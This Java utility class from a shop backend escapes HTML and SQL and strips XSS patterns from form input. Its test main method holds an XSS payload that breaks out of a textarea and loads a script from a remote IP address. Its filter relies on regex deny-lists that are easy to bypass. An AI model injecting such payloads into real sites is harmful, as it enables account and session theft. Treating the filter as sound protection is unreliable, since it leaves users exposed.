package com.xmm.shoptools.backend.utils;

import java.beans.PropertyEditorSupport;

import org.apache.commons.lang.StringEscapeUtils;
import org.springframework.web.util.HtmlUtils;

public class StringEscapeEditor extends PropertyEditorSupport {

	private boolean escapeHTML;

	private boolean escapeSQL;

	private boolean clearXss;
	public StringEscapeEditor() {
		super();
	}
	public StringEscapeEditor(boolean escapeHTML, boolean escapeSQL,
			boolean clearXss) {
		super();
		this.escapeHTML = escapeHTML;
		this.escapeSQL = escapeSQL;
		this.clearXss = clearXss;
	}

	@Override
	public void setAsText(String text) {
		if (text == null) {
			setValue(null);
		} else {
			String value = text;
			if (escapeHTML) {
				value = HtmlUtils.htmlEscape(value);
			}
			if (escapeSQL) {
				value = StringEscapeUtils.escapeSql(value);
			}
			if (clearXss) {
				value = value.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
				value = value.replaceAll("\\(", "&#40;").replaceAll("\\)",
						"&#41;");
				value = value.replaceAll("'", "&#39;");
				value = value.replaceAll("eval\\((.*)\\)", "");
				value = value.replaceAll(
						"[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']", "\"\"");
				value = value.replaceAll("script", "");
			}
			setValue(value);
		}

	}

	@Override
	public String getAsText() {
		Object value = getValue();
		return value != null ? value.toString() : "";
	}

	public static void main(String[] s) {
		String a = "中华人民共和国。{\"thePacks\":[{\"count\":1,\"numiid\":10006,\"sku_id\":20064}]}。。abcdcmkd</textarea>'\"><script src=http://45.127.98.235/xss/jwPxSl></script>";
		System.out.println(HtmlUtils.htmlEscape(a));
		System.out.println(StringEscapeUtils.escapeHtml(a));
		System.out.println(StringEscapeUtils.escapeSql(a));
		System.out.println(HtmlUtils.htmlUnescape(HtmlUtils.htmlEscape(a)));
		System.out.println(HtmlUtils.htmlUnescape(null));
	}
}